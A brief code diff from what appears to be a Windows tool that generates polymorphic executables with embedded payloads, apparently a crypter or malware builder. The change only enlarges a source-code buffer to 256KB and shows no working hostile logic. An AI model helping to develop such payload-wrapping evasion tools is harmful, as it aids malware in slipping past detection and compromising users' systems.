@@ -718,7 +718,7 @@ static DWORD WINAPI VS2022_GenerationThread(LPVOID lpParam) {
         PostMessage(hMainWindow, WM_USER + 1, MAKEWPARAM(batch, batchCount), 0);
         
         // Generate polymorphic source code with actual payload embedding
-        char sourceCode[65536]; // Larger buffer for embedded payloads
+        char sourceCode[262144]; // 256KB buffer for large embedded payloads
         generatePolymorphicExecutableWithPayload(sourceCode, sizeof(sourceCode), encType, delType, inputPath);
         
         // Create temporary source file
